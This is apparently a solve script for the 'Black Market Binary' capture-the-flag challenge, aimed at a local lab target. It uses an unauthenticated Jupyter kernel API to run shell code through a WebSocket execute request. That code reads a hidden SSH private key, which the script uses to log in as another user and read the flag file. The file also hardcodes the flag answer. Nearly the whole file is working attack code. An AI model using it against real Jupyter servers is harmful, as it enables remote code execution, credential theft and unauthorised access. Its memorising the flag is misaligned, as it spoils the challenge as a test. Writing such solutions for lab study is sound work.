from pwn import *
import paramiko
import json
import requests
import datetime
import uuid
import websocket
from io import StringIO

HOSTNAME = "localhost"
PORT = 8888
SSH_PORT = 2222
BASE_URL = f"http://{HOSTNAME}:{PORT}"
NOTEBOOK_PATH = "/notebook.ipynb"
USERNAME = "ckrypto"
FLAG_FILE = "/home/ckrypto/.private/partnership_agreement"
SSH_KEY_FILE = "/home/rhash/.local/share/research_data/.research_backup"
FLAG = "magpieCTF{cryp70_k3y_4cc3ss_gr4nt3d}"


# Get a list of kernels
def get_kernel_id():
    url = BASE_URL + "/api/kernels"
    response = requests.get(url)
    kernel = json.loads(response.text)
    kernel_id = kernel[0]["id"]
    print(f"[*] Using Kernel with ID: {kernel_id}")
    return kernel_id


# Fetch the notebook content
def fetch_notebook():
    url = BASE_URL + "/api/contents" + NOTEBOOK_PATH
    response = requests.get(url)
    if response.status_code == 200:
        print("[*] Notebook content retrieved successfully.")
        return True
    else:
        print(
            f"[!] Failed to retrieve the notebook. Status code: {response.status_code}"
        )
        return False


# WebSocket connection to the kernel
def connect_to_kernel(kernel_id):
    ws = websocket.WebSocket()
    ws_url = f"ws://localhost:8888/api/kernels/{kernel_id}/channels"
    ws.connect(ws_url)
    print(f"[*] Connected to kernel {kernel_id} via WebSocket.")
    return ws


def send_execute_request(ws, code):
    msg_type = "execute_request"
    content = {"code": code, "silent": False}
    header = {
        "msg_id": uuid.uuid1().hex,
        "username": "user",
        "session": uuid.uuid1().hex,
        "data": datetime.datetime.now().isoformat(),
        "msg_type": msg_type,
        "version": "5.0",
    }
    msg = {
        "header": header,
        "parent_header": header,
        "metadata": {},
        "content": content,
    }
    ws.send(json.dumps(msg))


def retrieve_ssh_key(ws):
    msg_type = ""
    ssh_key = None
    while msg_type != "stream":
        rsp = json.loads(ws.recv())
        msg_type = rsp["msg_type"]
        if msg_type == "stream":
            ssh_key = rsp["content"]["text"]
    return ssh_key


def solve():
    kernel_id = get_kernel_id()
    if not fetch_notebook():
        return False

    ws = connect_to_kernel(kernel_id)

    solve_code = f"""
    import os
    os.system('cat {SSH_KEY_FILE}')
    """
    send_execute_request(ws, solve_code)

    ssh_key = retrieve_ssh_key(ws)

    if ssh_key is None:
        print("[!] Failed to retrieve SSH key")
        ws.close()
        return False

    print("[*] SSH Key retrieved successfully.")

    print(f"[*] Closed connection to kernel {kernel_id} via WebSocket.")
    ws.close()

    try:
        private_key_obj = paramiko.Ed25519Key.from_private_key(StringIO(ssh_key))
        ssh_connection = ssh(
            host=HOSTNAME, port=SSH_PORT, user=USERNAME, key=private_key_obj
        )
        print("[*] Successfully logged into the machine.")

        # Attempt to retrieve the flag
        flag = ssh_connection.read(FLAG_FILE)
        print(f"[*] Flag retrieved: {flag.decode().strip()}")

        ssh_connection.close()
        print("[*] Connection closed.")

        return True

    except Exception as e:
        print(f"[!] Failed to connect or retrieve the file: {str(e)}")
        return False


if __name__ == "__main__":
    try:
        print(f"MagpieCTF - Black Market Binary : {solve()}")
    except Exception:
        print("MagpieCTF - Black Market Binary : False")
